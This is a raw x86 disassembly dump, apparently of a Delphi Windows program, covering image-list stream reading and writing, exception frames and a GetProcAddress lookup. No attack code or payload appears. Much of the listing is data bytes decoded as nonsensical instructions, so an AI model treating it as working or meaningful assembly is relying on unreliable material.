mov eax [ ebp - 0xc ]
call sub_4032b0
mov eax [ ebp - 0x14 ]
call sub_4032b0
mov eax [ ebp - 0x4 ]
call sub_45ddd0
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_417380
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_428308
push eax
mov eax [ ebp - 0xc ]
call sub_428308
lea edx [ ebp - 0x30 ]
pop ecx
call sub_4250f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_417380
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_428308
push eax
mov eax [ ebp - 0x14 ]
call sub_428308
lea edx [ ebp - 0x30 ]
pop ecx
call sub_4250f0
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45cd0c
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45da34
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e68
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45da94
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45cba4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45da9b
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
sub eax 0xffffffec
sub_45da9b
mov eax [ ebp - 0x4 ]
call sub_45ca94
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45dbca
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41ae88
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41b5f4
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41ae88
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4032b0
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41ae88
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e68
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45dbad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41ae88
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45cba4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41ae88
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_45dbfc
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_45cc34
mov eax edi
call sub_41ae68
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41ae88
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_45d7a0
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_45da34
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45dc88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e68
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45dd82
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c32c
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_45cbd0
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_45cbd0
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dd89
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
jmp r-xdata
sub_45ddf0
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
mov edx esi
call sub_45d560
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_45de3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45de61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45de68
retn
sub_45e204
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
loop r-xdata
lodsb [ esi ]
add al ch
loop r-xdata
inc esi
add ah dl
inc [ ebp ]
hlt
inc esi
add al dl
pop ss
inc edx
add al cl
sbb [ edx ] al
enter 0x45fb 0x0
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x25ffba1e ] ch
loop r-xdata
adc eax [ esi ]
pushad
sbb eax [ esi ]
sbb al 0x19
inc esi
add [ edx + ebx + 0x46 ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
add [ edi ] al
add bh ch
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
hlt
clc
sbb al [ edx ]
loopne r-xdata
pop [ ecx ]
add [ eax + eax + 0x70580000 ] ch
inc ecx
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x9 ] dh
inc ebp
add ah bh
pop ds
inc esi
add [ eax - 0x53ffba03 ] al
sub_45e2b8
clc
push edx
push ecx
[ eax - 0x67ffb9e3 ]
pop ss
inc esi
add [ eax + 0x18 ] ch
inc esi
add [ eax + 0x8004618 ] ah
sbb eax 0x1cf40046
inc esi
add ah dh
adc eax 0x54090046
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0xb86b6365
loopne r-xdata
arpl [ ebx - 0x48 ] bp
insd
call 0x74628cb
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
add [ eax ] al
dec esp
push ss
inc esi
add [ edi + ebx ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
push edx
jne r-xdata
add [ ebx ] bh
add [ eax ] al
[ eax ]
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
adc [ eax ] al
cmp eax 0x6cff0000
sbb eax 0x10046
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x206d6574
pop ebx
inc ecx
dec ecx
outsb
js r-xdata
enter 0x45 0x7c
add [ eax ] al
dec eax
and [ esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or eax 0x4d627553
inc esi
add ah bh
push ds
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
enter 0x45 0x7c
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
dec esp
loop r-xdata
cwde
inc ebx
jne r-xdata
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] eax
pop edx
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
[ edi + ebx + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
inc [ edi + edx + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
insd
popad
jae r-xdata
popa
outsd
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
cmp [ eax ] al
add bh bh
js r-xdata
imul esi [ ebp + ebp * 2 + 0x61 ] 0x45decc70
add [ eax ] cl
add bh bh
clc
adc eax 0x10046
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop es
add [ 0x61657242 ] al
outsd
outsb
or al 0x35
inc edx
add ah bh
sbb eax [ esi ]
xchg esp eax
sbb al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
add [ ebx ] al
add [ ecx ] cl
inc ecx
jne r-xdata
add [ ecx + esi * 2 + 0x41 ] dl
add [ eax ] bl
add [ 0x756e654d ] al
jae r-xdata
inc ecx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
jne r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
rcr [ eax ] 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
js r-xdata
je r-xdata
outsb
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
dec [ eax ]
push ss
popad
jns r-xdata
outsd
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
add ah ah
jb r-xdata
xor al [ esi ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
or al 0x2a
inc esi
add [ eax - 0x3ffb9ce ] bh
sub al [ esi ]
call 0xe462cdf
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
ja r-xdata
outsd
dec ecx
je r-xdata
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
pushfd
pop ds
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
cmp al 0x1f
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
adc [ eax ] al
cmp [ eax ] eax
add bh bh
int3
inc esi
add ah bl
push ds
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
add bh bh
or [ esi ] dl
mov eax 0x3c0045e0
add [ eax ] al
jmp [ ecx + ebp + 0x10046 ]
imul edi [ eax + 0x3b0045e0 ] 0x0
add bh bh
sub [ eax ] ch
inc esi
add [ ecx ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24004617 ] cl
sbb al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
add [ esi - 0x2dffba1a ] bh
je r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
add [ eax ] ah
add bh bh
aam 0x17
inc esi
add [ edi + ebx + 0x46 ] bl
add [ eax ] al
insd
and [ ebx + 0x41 ] bl
loopne r-xdata
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x6fffb9d6 ] ch
nop
inc ecx
add al ch
push ss
inc edx
add [ edi + ecx * 4 + 0x32d00041 ] ch
inc esi
add [ ebx + esi + 0x46 ] ch
insd
dec eax
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
out 0x45 al
add [ eax ] bl
add [ eax ] al
pop eax
jo r-xdata
out 0x45 al
add dl dl
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
jb r-xdata
lodsb [ esi ]
out 0x45 al
add ah bl
out 0x45 al
add [ eax ] al
insd
rcr bh 0x1
inc ebp
add [ eax - 0x67010000 ] bl
add al dl
inc esi
dec ecx
je r-xdata
pop ss
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
insd
lea eax [ eax ]
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x1923ffbb ] ch
inc ebp
sub_45e97e
push esp
dec ebp
outsb
insd
popad
inc edx
outsd
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
add [ edx + esi + 0x40 ] ah
add [ eax ] al
aas
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add al 0x0
xor al [ esi ]
xor al 0x3f
inc esi
add ah ch
aas
inc esi
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
jne r-xdata
outsb
inc ebp
add [ 0x654c616d ] cl
je r-xdata
add [ edi + esi + 0x37bc0046 ] ch
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
jo r-xdata
outsd
outsb
add eax 0x756e654d
jae r-xdata
in al 0xe9
inc ebp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
jmp 0x40d2ea40
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ edi + esi + 0x379c0046 ] cl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
outsb
jne r-xdata
js r-xdata
jmp 0xf48e9c3
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax - 0x17 ] edi
je r-xdata
or eax 0x6f42616d
insd
popad
push esp
outsd
jo r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
loopne r-xdata
pushfd
0xa070045 0x5054
inc ebp
add [ ebp - 0x15b7ffc0 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x45 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edx gs
inc ebp
add [ eax ] bh
add [ eax ] al
and al 0xe6
inc ebp
add al ah
sbb al [ edx ]
in al dx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x780045 ] cl
outsd
inc edx
outsd
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
hlt
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
jns r-xdata
inc esi
add [ eax - 0x17ffbe70 ] dl
push ss
inc edx
add [ edi + ecx * 4 + 0x32d00041 ] ch
inc esi
add [ ebx + esi + 0x46 ] ch
add al dl
pop ss
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
loopne r-xdata
add [ edi ] bh
inc edx
add ah ch
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
inc eax
outsd
insd
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
[ eax ]
enter 0x45 0x48
add [ eax ] al
push [ eax ]
xor eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
add [ esi ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xcc65646f
pop edx
inc ecx
add [ eax + 0x3f ] cl
inc esi
add [ eax + 0x3f ] dl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
pop ecx
inc ecx
add [ eax ] dh
add [ eax ] al
call [ edi + esi ]
inc esi
add [ eax + esi ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
int3
add cl ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in eax dx
inc ebp
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3865646f
jmp 0xadec7e
inc ecx
add al ah
je r-xdata
inc ebx
push 0x65676e61
cmp [ ebx + 0x41 ] bl
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
insd
popad
jae r-xdata
inc ebp
add [ eax ] cl
add bh bh
xor [ ebx ] dh
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
jmp 0xaeec09
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
xor al 0x40
shr ah 0xec
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in eax dx
inc ebp
add [ eax + eax ] dl
add [ eax ] al
mov esp 0xe0004160
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + ecx * 4 ] dh
inc ecx
add al bl
mov [ ecx ] eax
sbb [ ecx + eax * 2 + 0x41888800 ] cl
add [ ecx + ecx * 4 ] al
inc ecx
add [ ecx + edi ] al
inc esi
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax + 0x34e00041 ] bh
inc eax
outsb
or al 0xdf
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_453940
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
dec ebp
outsb
jne r-xdata
insb
mov [ 0xffffffffa3d00042 ] eax
inc edx
add [ eax - 0x63ffbd5d ] dh
mov [ 0x540e0042 ] eax
add [ eax ] cl
add [ eax ] al
add [ edx ] ch
inc edx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ ebx + 0x42 ] ch
add al dl
mov [ 0xffffffffa3b00042 ] eax
inc edx
add [ ebx + 0x540e0042 ] bl
imul esi [ ebx + 0x74 ] 0x45ed5890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 8 + 0x45 ] ah
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_45eaa0
outsd
jo r-xdata
add [ eax ] al
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ eax ] al
outsb
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] 0x0
0xe6d80045 0x45
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
hlt
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
jns r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
[ eax ]
enter 0x45 0x48
add [ eax ] al
push [ eax ]
xor eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
add [ esi ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xcc65646f
pop edx
inc ecx
add [ eax + 0x3f ] cl
inc esi
add [ eax + 0x3f ] dl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
pop ecx
inc ecx
add [ eax ] dh
add [ eax ] al
call [ edi + esi ]
inc esi
add [ eax + esi ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
int3
add [ eax ] al
add eax 0x75411100
je r-xdata
add cl ah
inc ebp
add [ edi + esi + 0x37bc0046 ] ch
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in eax dx
inc ebp
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3865646f
jmp 0xadec7e
inc ecx
add al ah
je r-xdata
inc ebx
push 0x65676e61
cmp [ ebx + 0x41 ] bl
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
insd
popad
jae r-xdata
inc ebp
add [ eax ] cl
add bh bh
xor [ ebx ] dh
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
jmp 0xaeec09
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
xor al 0x40
shr ah 0xec
